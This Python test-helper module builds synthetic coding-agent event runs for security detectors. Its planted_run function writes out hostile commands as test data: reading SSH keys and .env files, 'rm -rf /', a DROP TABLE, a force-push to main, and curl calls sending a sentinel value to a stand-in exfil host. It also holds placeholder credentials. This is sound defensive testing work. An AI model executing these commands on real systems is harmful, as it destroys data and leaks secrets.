"""Builders for the security detector tests: runs of shell, file, git and db events."""

import json
from datetime import UTC, datetime, timedelta
from typing import Any

from abb_event_schema.event import Event
from abb_event_schema.ids import IdKind, new_id

from abb_api.findings.build import build_context
from abb_api.findings.detectors import DETECTORS, run_all
from abb_api.findings.model import Finding, SecurityInputs
from tests.detector_helpers import to_event

T0 = datetime(2026, 10, 1, 9, 0, 0, tzinfo=UTC)
PLANT = "PLANTED-SENTINEL-4f9c"  # appears in every planted path, command, host and value


# Attributes the registry requires per event type (and family): tests state only what matters.
_REQUIRED: dict[str, dict[str, Any]] = {
    "llm.request": {"llm.model": "model-x", "llm.provider": "provider-x"},
    "http.request": {"http.method": "GET"},
    "http.response": {"http.status_code": 200},
    "tool.call": {"tool.name": "tool-x"},
}


class Run:
    """A run under construction; `n` numbers events so order is the order of the calls."""

    def __init__(self) -> None:
        self.run_id = new_id(IdKind.RUN)
        self.trace_id = new_id(IdKind.TRACE)
        self.wires: list[dict[str, Any]] = []
        self.add("run.started", {})

    def add(
        self,
        event_type: str,
        attributes: dict[str, Any] | None = None,
        *,
        span_id: str | None = None,
        payload: dict[str, Any] | None = None,
    ) -> str:
        n = len(self.wires) + 1
        required = _REQUIRED.get(event_type) or _REQUIRED.get(event_type.rsplit(".", 1)[0], {})
        attributes = {**required, **(attributes or {})}
        wire: dict[str, Any] = {
            "schema_version": "1.0",
            "event_id": new_id(IdKind.EVENT),
            "run_id": self.run_id,
            "trace_id": self.trace_id,
            "span_id": span_id or new_id(IdKind.SPAN),
            "agent_id": "coding-agent",
            "event_type": event_type,
            "occurred_at": (T0 + timedelta(seconds=n)).isoformat().replace("+00:00", "Z"),
            "sequence": n,
            "attributes": attributes,
        }
        if payload is not None:
            wire["payload"] = payload
        self.wires.append(wire)
        return str(wire["event_id"])

    def shell(self, command: str, risk: str | None = None, *, exit_code: int = 0) -> list[str]:
        """A started and a completed event of one command (one span), as the SDK emits them."""
        span = new_id(IdKind.SPAN)
        attrs: dict[str, Any] = {"shell.command": command}
        if risk:
            attrs["shell.risk_class"] = risk
        first = self.add("shell.command.started", attrs, span_id=span)
        second = self.add(
            "shell.command.completed", {**attrs, "shell.exit_code": exit_code}, span_id=span
        )
        return [first, second]

    def file(self, event_type: str, path: str) -> str:
        return self.add(event_type, {"file.path": path})

    def events(self) -> list[Event]:
        return [to_event(w) for w in self.wires]


def findings_of(
    run: Run | list[Event],
    *,
    muted: tuple[str, ...] = (),
    allowlist: tuple[str, ...] = (),
    artifact_kinds: dict[str, tuple[str, ...]] | None = None,
) -> list[Finding]:
    """The security findings (`sec.*`) of a run, through the real `run_all`."""
    events = run.events() if isinstance(run, Run) else run
    ctx = build_context(events)
    from dataclasses import replace

    ctx = replace(
        ctx,
        security=SecurityInputs(
            muted=frozenset(muted),
            destination_allowlist=allowlist,
            artifact_kinds=artifact_kinds or {},
        ),
    )
    return [f for f in run_all(ctx, DETECTORS) if f.detector.startswith("sec.")]


def by_detector(found: list[Finding]) -> dict[str, Finding]:
    return {f.detector: f for f in found}


def serialized(found: list[Finding]) -> str:
    """Every field of every finding, as one string, for leak scans."""
    return json.dumps(
        [
            {
                "detector": f.detector,
                "version": f.detector_version,
                "type": f.finding_type,
                "kind": f.kind.value,
                "severity": f.severity.value,
                "evidence": f.evidence,
                "ids": list(f.evidence_event_ids),
                "fingerprint": f.fingerprint,
            }
            for f in found
        ],
        sort_keys=True,
    )


AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
PRIVATE_KEY = (
    "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAplantedplantedplanted\n"
    "-----END RSA PRIVATE KEY-----"
)
ALLOWED_HOST = "api.example.com"


def planted_run(tag: str = "acme") -> tuple[Run, dict[str, list[str]]]:
    """A run that touches a secret file, prints an AWS-style key and a private key, wipes a disk,
    force-pushes main, drops a table and contacts a host off the allowlist, with `PLANT` in every
    path, command and host. Returns the run and the event ids each detector must cite."""
    sentinel = f"{PLANT}-{tag}"
    host = sentinel.lower()
    run = Run()
    run.shell("pytest -q", "R1")  # ordinary activity around the planted events
    run.file("file.read", "src/app.py")
    expected: dict[str, list[str]] = {}
    env = run.file("file.read", f"/work/{sentinel}/.env")
    key = run.shell(f"cat ~/.ssh/id_rsa # {sentinel}", "R1")
    expected["sec.secret_file_read"] = [env, key[0]]
    aws = run.add(
        "shell.command.completed",
        {"shell.command": "make deploy"},
        payload={"stdout": f"AWS_KEY={AWS_KEY}"},
    )
    pem = run.add(
        "shell.command.completed",
        {"shell.command": "cat deploy.log"},
        payload={"stdout": PRIVATE_KEY},
    )
    expected["sec.credential_in_output"] = [aws, pem]
    wipe = run.shell(f"rm -rf / # {sentinel}", "R4")
    drop = run.shell(f'psql -c "DROP TABLE {sentinel}"', "R3")
    expected["sec.destructive_command"] = [wipe[0], drop[0]]
    expected["sec.privileged_db"] = [drop[0]]
    push = run.shell(f"git push --force origin main # {sentinel}", "R3")
    expected["sec.risky_git"] = [push[0]]
    run.shell(f"curl -s https://{ALLOWED_HOST}/health", "R2")
    out = run.shell(f"curl -s https://{host}.exfil.example.net/x?k={sentinel}", "R2")
    http = run.add("http.request", {"http.url": f"https://{host}.exfil.example.org/{sentinel}"})
    expected["sec.unexpected_destination"] = [out[0], http]
    return run, expected
